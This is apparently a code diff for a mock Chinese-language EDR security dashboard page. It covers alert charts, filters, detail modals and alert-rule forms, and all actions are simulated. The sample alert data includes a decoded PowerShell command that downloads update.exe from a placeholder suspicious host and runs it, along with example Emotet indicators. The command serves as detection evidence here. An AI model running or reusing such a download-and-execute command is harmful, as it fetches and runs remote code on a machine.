+            const alertTypeCtx = document.getElementById('alertTypeChart').getContext('2d');
+            const alertTypeChart = new Chart(alertTypeCtx, {
+                type: 'doughnut',
+                data: {
+                    labels: ['恶意软件', '可疑脚本', '横向移动', '持久化', '数据渗出', '暴力破解', '其他'],
+                    datasets: [{
+                        data: [42, 38, 15, 24, 8, 22, 10],
+                        backgroundColor: [
+                            '#dc2626',
+                            '#b91c1c',
+                            '#d97706',
+                            '#f59e0b',
+                            '#3b82f6',
+                            '#10b981',
+                            '#9ca3af'
+                        ],
+                        borderWidth: 1
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: {
+                            position: 'right',
+                        }
+                    }
+                }
+            });
+
+            // 全选/取消全选功能
+            document.getElementById('select-all').addEventListener('change', function() {
+                const checkboxes = document.querySelectorAll('.alert-select');
+                checkboxes.forEach(checkbox => {
+                    checkbox.checked = this.checked;
+                });
+            });
+
+            // 绑定菜单点击事件
+            const menuItems = document.querySelectorAll('.menu-item');
+            menuItems.forEach(item => {
+                item.addEventListener('click', function() {
+                    // 移除所有菜单的active类
+                    menuItems.forEach(menu => menu.classList.remove('active'));
+                    // 给当前点击的菜单添加active类
+                    this.classList.add('active');
+                    
+                    // 更新面包屑
+                    document.getElementById('breadcrumb').textContent = this.querySelector('span').textContent;
+                });
+            });
+        });
+
+        // 筛选告警
+        function filterAlerts() {
+            const severity = document.getElementById('alert-severity').value;
+            const status = document.getElementById('alert-status').value;
+            const source = document.getElementById('alert-source').value;
+            const time = document.getElementById('alert-time').value;
+            const search = document.getElementById('search-alert').value;
+            
+            showToast(`筛选条件已应用：级别=${severity}，状态=${status}，来源=${source}，时间=${time}`);
+        }
+
+        // 重置告警筛选条件
+        function resetAlertFilters() {
+            document.getElementById('alert-severity').value = 'all';
+            document.getElementById('alert-status').value = 'all';
+            document.getElementById('alert-source').value = 'all';
+            document.getElementById('alert-time').value = '7d';
+            document.getElementById('search-alert').value = '';
+            
+            showToast('筛选条件已重置');
+        }
+
+        // 批量处理选中的告警
+        function handleAllSelected() {
+            const selectedCount = document.querySelectorAll('.alert-select:checked').length;
+            if (selectedCount === 0) {
+                showToast('请先选择需要处理的告警');
+                return;
+            }
+            
+            if (confirm(`确定要批量处理选中的${selectedCount}条告警吗？`)) {
+                showToast(`已批量处理${selectedCount}条告警`);
+                // 实际应用中这里会更新告警状态
+            }
+        }
+
+        // 导出告警数据
+        function exportAlerts() {
+            showToast('正在导出告警数据，请稍候...');
+            // 模拟导出延迟
+            setTimeout(() => {
+                showToast('告警数据已成功导出为CSV文件');
+            }, 1500);
+        }
+
+        // 显示告警详情
+        function showAlertDetail(alertId) {
+            const modal = document.getElementById('alertDetailModal');
+            const title = document.getElementById('alertDetailTitle');
+            const body = document.getElementById('alertDetailBody');
+            
+            // 根据不同告警ID展示不同详情
+            let detailHtml = '';
+            if (alertId === 1) {
+                title.textContent = '检测到Emotet恶意软件活动 - 告警详情';
+                detailHtml = `
+                    <div class="alert-detail-header">
+                        <div class="alert-title">检测到Emotet恶意软件活动</div>
+                        <div class="alert-meta">
+                            <div>资产：WIN-SERVER-01 (192.168.1.101)</div>
+                            <div class="alert-severity"><span class="tag tag-critical">紧急</span></div>
+                            <div>类型：恶意软件</div>
+                            <div>状态：<span class="tag tag-unhandled">未处理</span></div>
+                            <div>发生时间：2025-08-27 14:32:15</div>
+                            <div>告警ID：ALERT-20250827-001</div>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-section">
+                        <h4>告警描述</h4>
+                        <div class="alert-description">
+                            <p>EDR客户端在WIN-SERVER-01上检测到Emotet恶意软件活动。该恶意软件通常通过钓鱼邮件传播，能够窃取敏感信息并下载其他恶意程序。</p>
+                            <p>检测到的恶意行为包括：</p>
+                            <ul style="margin-left: 20px; margin-top: 5px;">
+                                <li>可疑的进程注入行为</li>
+                                <li>与已知C2服务器的通信尝试</li>
+                                <li>异常的注册表修改操作</li>
+                                <li>可疑的文件加密活动</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-section">
+                        <h4>建议处理措施</h4>
+                        <div class="alert-actions">
+                            <h5>推荐处理步骤：</h5>
+                            <ol class="action-steps">
+                                <li>立即隔离受影响资产，防止恶意软件扩散</li>
+                                <li>执行全盘扫描以检测和清除恶意文件</li>
+                                <li>检查系统日志，确定感染源和攻击路径</li>
+                                <li>重置可能被窃取的凭据</li>
+                                <li>检查网络日志，识别其他可能受影响的资产</li>
+                                <li>更新EDR客户端和病毒库至最新版本</li>
+                            </ol>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-section">
+                        <h4>检测证据</h4>
+                        <div>
+                            <div style="margin-bottom: 10px; font-weight: 500;">恶意进程信息：</div>
+                            <div class="evidence-item">
+进程名称：svchost.exe (可疑路径: C:\Windows\Temp\svchost.exe)
+进程ID：1248
+父进程：explorer.exe (PID: 860)
+命令行参数：C:\Windows\Temp\svchost.exe -silent -install
+创建时间：2025-08-27 14:25:03
+                            </div>
+                            
+                            <div style="margin-bottom: 10px; margin-top: 15px; font-weight: 500;">网络连接信息：</div>
+                            <div class="evidence-item">
+源IP: 192.168.1.101:54321
+目标IP: 185.234.76.123:80
+连接时间: 2025-08-27 14:28:43
+流量特征: 与Emotet C2服务器通信模式匹配
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-section">
+                        <h4>关联威胁情报</h4>
+                        <div>
+                            <p>Emotet是一种模块化银行木马，自2014年出现以来不断演变，具有强大的传播能力和信息窃取功能。近期活动主要通过带有恶意附件的钓鱼邮件传播。</p>
+                            <p style="margin-top: 5px;">相关IOCs：</p>
+                            <div class="evidence-item">
+IP地址: 185.234.76.123, 94.158.58.xxx, 193.169.xxx.xxx
+域名: updates-system[.]com, secure-upgrade[.]info
+文件哈希 (SHA256): a7f3d9c2e4b8a1f3e5d7c9b0a2f4e6d8c0b1a3f5e7d9c8b0a1f2e3d4c5b6a7
+                            </div>
+                        </div>
+                    </div>
+                `;
+            } else {
+                // 通用告警详情模板
+                const alertInfo = {
+                    2: {
+                        title: "可疑PowerShell编码命令执行",
+                        asset: "DESKTOP-8F3K29A",
+                        ip: "192.168.2.56",
+                        severity: "high",
+                        severityText: "高危",
+                        type: "可疑脚本",
+                        status: "unhandled",
+                        statusText: "未处理",
+                        time: "2025-08-27 13:45:02",
+                        id: "ALERT-20250827-002",
+                        description: "检测到使用Base64编码的PowerShell命令执行，这是攻击者常用的规避检测技术。编码命令已被解析并发现包含可疑操作。",
+                        actions: `<ol class="action-steps">
+                            <li>分析PowerShell命令内容，确定是否为恶意活动</li>
+                            <li>检查相关用户的登录记录和操作行为</li>
+                            <li>如果确认是恶意活动，隔离受影响资产</li>
+                            <li>扫描系统以查找可能的后门或持久化机制</li>
+                        </ol>`,
+                        evidence: `<div style="margin-bottom: 10px; font-weight: 500;">PowerShell命令信息：</div>
+                            <div class="evidence-item">
+原始命令: powershell -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFAAYQB0AGgA...
+解码后: $s=New-Object IO.Path;$p=$s::GetTempPath();$f=$s::Combine($p,'update.exe');(New-Object Net.WebClient).DownloadFile('http://suspicious-site.com/update.exe',$f);Start-Process $f
+                            </div>`
+                    },
+                    3: {
+                        title: "检测到横向移动尝试",
+                        asset: "SRV-DB-02",
+                        ip: "192.168.1.205",
+                        severity: "high",
+                        severityText: "高危",
+                        type: "横向移动",
+                        status: "handling",
+                        statusText: "处理中",
+                        time: "2025-08-27 11:23:45",
+                        id: "ALERT-20250827-003"
+                    },
+                    4: {
+                        title: "异常注册表持久化项创建",
+                        asset: "DESKTOP-USER05",
+                        ip: "192.168.2.89",
+                        severity: "medium",
+                        severityText: "中危",
+                        type: "持久化",
+                        status: "handled",
+                        statusText: "已处理",
+                        time: "2025-08-27 10:15:32",
+                        id: "ALERT-20250827-004"
+                    },
+                    5: {
+                        title: "与已知恶意IP的连接尝试",
+                        asset: "LAPTOP-SALES03",
+                        ip: "192.168.2.110",
+                        severity: "medium",
+                        severityText: "中危",
+                        type: "恶意连接",
+                        status: "ignored",
+                        statusText: "已忽略",
+                        time: "2025-08-27 09:08:17",
+                        id: "ALERT-20250827-005"
+                    }
+                };
+
+                const info = alertInfo[alertId];
+                title.textContent = `${info.title} - 告警详情`;
+                detailHtml = `
+                    <div class="alert-detail-header">
+                        <div class="alert-title">${info.title}</div>
+                        <div class="alert-meta">
+                            <div>资产：${info.asset} (${info.ip})</div>
+                            <div class="alert-severity"><span class="tag tag-${info.severity}">${info.severityText}</span></div>
+                            <div>类型：${info.type}</div>
+                            <div>状态：<span class="tag tag-${info.status}">${info.statusText}</span></div>
+                            <div>发生时间：${info.time}</div>
+                            <div>告警ID：${info.id}</div>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-section">
+                        <h4>告警描述</h4>
+                        <div class="alert-description">
+                            <p>${info.description || "系统检测到异常活动，可能表明存在安全威胁。建议进行进一步调查以确定是否为恶意行为。"}</p>
+                        </div>
+                    </div>
+                    
+                    <div class="detail-section">
+                        <h4>建议处理措施</h4>
+                        <div class="alert-actions">
+                            <h5>推荐处理步骤：</h5>
+                            ${info.actions || `<ol class="action-steps">
+                                <li>调查告警详情和相关日志</li>
+                                <li>确认活动是否为正常业务操作</li>
+                                <li>如确认为恶意活动，采取相应的 containment 措施</li>
+                                <li>记录处理过程和结果</li>
+                            </ol>`}
+                        </div>
+                    </div>
+                    
+                    <div class="detail-section">
+                        <h4>检测证据</h4>
+                        <div>
+                            ${info.evidence || `<div class="evidence-item">
+相关日志和活动记录已被EDR系统捕获并保存，可通过日志查询功能查看完整信息。
+                            </div>`}
+                        </div>
+                    </div>
+                `;
+            }
+            
+            body.innerHTML = detailHtml;
+            modal.classList.add('active');
+        }
+
+        // 关闭告警详情弹窗
+        function closeAlertDetailModal() {
+            document.getElementById('alertDetailModal').classList.remove('active');
+        }
+
+        // 处理告警
+        function handleAlert(alertId) {
+            // 存储当前处理的告警ID，实际应用中可能需要
+            currentAlertId = alertId;
+            document.getElementById('handleAlertModal').classList.add('active');
+        }
+
+        // 关闭处理告警弹窗
+        function closeHandleAlertModal() {
+            document.getElementById('handleAlertModal').classList.remove('active');
+        }
+
+        // 提交处理结果
+        function submitHandleResult() {
+            const method = document.getElementById('handle-method').value;
+            const notes = document.getElementById('handle-notes').value;
+            
+            if (!notes) {
+                showToast('请输入处理记录');
+                return;
+            }
+            
+            showToast('告警处理结果已提交');
+            closeHandleAlertModal();
+            
+            // 清空表单
+            document.getElementById('handle-method').value = 'quarantine';
+            document.getElementById('handle-notes').value = '';
+            document.getElementById('handle-attachment').value = '';
+        }
+
+        // 标记告警为已处理
+        function completeHandle(alertId) {
+            if (confirm('确定已完成该告警的处理工作吗？')) {
+                showToast(`告警 ${alertId} 已标记为处理完成`);
+            }
+        }
+
+        // 查看处理记录
+        function viewHandleRecord(alertId) {
+            showToast(`正在查看告警 ${alertId} 的处理记录...`);
+        }
+
+        // 忽略告警
+        function ignoreAlert() {
+            if (confirm('确定要忽略此告警吗？忽略后将不再提醒。')) {
+                showToast('告警已忽略');
+                closeAlertDetailModal();
+            }
+        }
+
+        // 取消忽略告警
+        function unignoreAlert(alertId) {
+            showToast(`已取消忽略告警 ${alertId}`);
+        }
+
+        // 开始处理告警
+        function startHandleAlert() {
+            closeAlertDetailModal();
+            document.getElementById('handleAlertModal').classList.add('active');
+        }
+
+        // 隔离告警相关资产
+        function isolateAlertAsset() {
+            if (confirm('确定要隔离相关资产吗？这将限制该资产的网络连接。')) {
+                showToast('资产已隔离');
+            }
+        }
+
+        // 显示提示消息
+        function showToast(message) {
+            // 检查是否已有toast，如有则移除
+            const existingToast = document.querySelector('.toast');
+            if (existingToast) {
+                existingToast.remove();
+            }
+            
+            // 创建新toast
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            
+            // 3秒后移除
+            setTimeout(() => {
+                toast.remove();
+            }, 3000);
+        }
+        
+        // 告警规则相关函数
+        function showAlertRulesModal() {
+            document.getElementById('alertRulesModal').classList.add('active');
+        }
+
+        function closeAlertRulesModal() {
+            document.getElementById('alertRulesModal').classList.remove('active');
+            hideAlertRuleForm();
+        }
+
+        function showAddAlertRuleForm() {
+            document.getElementById('ruleId').value = '';
+            document.getElementById('alertRuleFormTitle').textContent = '添加新告警规则';
+            document.getElementById('ruleForm').reset();
+            document.getElementById('alertRuleForm').style.display = 'block';
+            // 滚动到表单位置
+            document.getElementById('alertRuleForm').scrollIntoView({behavior: 'smooth'});
+        }
+
+        function editAlertRule(id) {
+            // 模拟加载规则数据
+            const rules = {
+                1: {
+                    name: 'CPU使用率过高',
+                    category: 'performance',
+                    severity: 'warning',
+                    metric: 'cpu',
+                    operator: 'gt',
+                    threshold: '90',
+                    duration: '300',
+                    notifySystem: true,
+                    notifyEmail: true,
+                    notifySms: false,
+                    notifyWebhook: false,
+                    description: '当CPU使用率持续5分钟超过90%时触发告警',
+                    enabled: true
+                },
+                2: {
+                    name: '内存使用率过高',
+                    category: 'performance',
+                    severity: 'warning',
+                    metric: 'memory',
+                    operator: 'gt',
+                    threshold: '90',
+                    duration: '300',
+                    notifySystem: true,
+                    notifyEmail: true,
+                    notifySms: false,
+                    notifyWebhook: false,
+                    description: '当内存使用率持续5分钟超过90%时触发告警',
+                    enabled: true
+                },
+                3: {
+                    name: '恶意文件检测',
+                    category: 'security',
+                    severity: 'critical',
+                    metric: 'malware',
+                    operator: 'detect',
+                    threshold: '',
+                    duration: '0',
+                    notifySystem: true,
+                    notifyEmail: true,
+                    notifySms: true,
+                    notifyWebhook: true,
+                    description: '当检测到恶意文件时立即触发告警',
+                    enabled: true
+                },
+                4: {
+                    name: '异常登录检测',
+                    category: 'security',
+                    severity: 'critical',
+                    metric: 'login',
+                    operator: 'detect',
+                    threshold: '',
+                    duration: '0',
+                    notifySystem: true,
+                    notifyEmail: true,
+                    notifySms: true,
+                    notifyWebhook: false,
+                    description: '当检测到异地登录或异常时间登录时触发告警',
+                    enabled: false
+                }
+            };
+            
+            const rule = rules[id];
+            if (rule) {
+                document.getElementById('ruleId').value = id;
+                document.getElementById('alertRuleFormTitle').textContent = '编辑告警规则';
+                document.getElementById('ruleName').value = rule.name;
+                document.getElementById('ruleCategory').value = rule.category;
+                document.getElementById('ruleSeverity').value = rule.severity;
+                document.getElementById('ruleMetric').value = rule.metric;
+                document.getElementById('ruleOperator').value = rule.operator;
+                document.getElementById('ruleThreshold').value = rule.threshold;
+                document.getElementById('ruleDuration').value = rule.duration;
+                document.getElementById('notifySystem').checked = rule.notifySystem;
+                document.getElementById('notifyEmail').checked = rule.notifyEmail;
+                document.getElementById('notifySms').checked = rule.notifySms;
+                document.getElementById('notifyWebhook').checked = rule.notifyWebhook;
+                document.getElementById('ruleDescription').value = rule.description;
+                document.getElementById('ruleEnabled').checked = rule.enabled;
+                
+                document.getElementById('alertRuleForm').style.display = 'block';
+                // 滚动到表单位置
+                document.getElementById('alertRuleForm').scrollIntoView({behavior: 'smooth'});
+            }
+        }
+
+        function hideAlertRuleForm() {
+            document.getElementById('alertRuleForm').style.display = 'none';
+        }
+
+        function saveAlertRule() {
+            const ruleId = document.getElementById('ruleId').value;
+            const ruleName = document.getElementById('ruleName').value;
+            
+            if (!ruleName) {
+                showToast('请输入规则名称', 'error');
+                return;
+            }
+            
+            // 模拟保存规则
+            showToast(`正在${ruleId ? '更新' : '创建'}告警规则...`);
+            
+            setTimeout(() => {
+                showToast(`${ruleId ? '更新' : '创建'}告警规则成功: ${ruleName}`, 'success');
+                hideAlertRuleForm();
+                // 这里可以添加刷新规则列表的逻辑
+            }, 1000);
+        }
+
+        // 在页面初始化时添加告警规则相关事件监听
+        document.addEventListener('DOMContentLoaded', function() {
+            // 原有的初始化代码...
+            
+            // 根据选择的指标类型显示或隐藏阈值
+            document.getElementById('ruleMetric').addEventListener('change', function() {
+                const thresholdField = document.getElementById('ruleThreshold').parentElement;
+                const operatorSelect = document.getElementById('ruleOperator');
+                
+                if (this.value === 'malware' || this.value === 'login') {
+                    // 这些指标只需要"检测到"操作符
+                    operatorSelect.value = 'detect';
+                    operatorSelect.disabled = true;
+                    thresholdField.style.display = 'none';
+                } else {
+                    // 性能指标需要比较操作符和阈值
+                    operatorSelect.disabled = false;
+                    thresholdField.style.display = 'block';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
+    
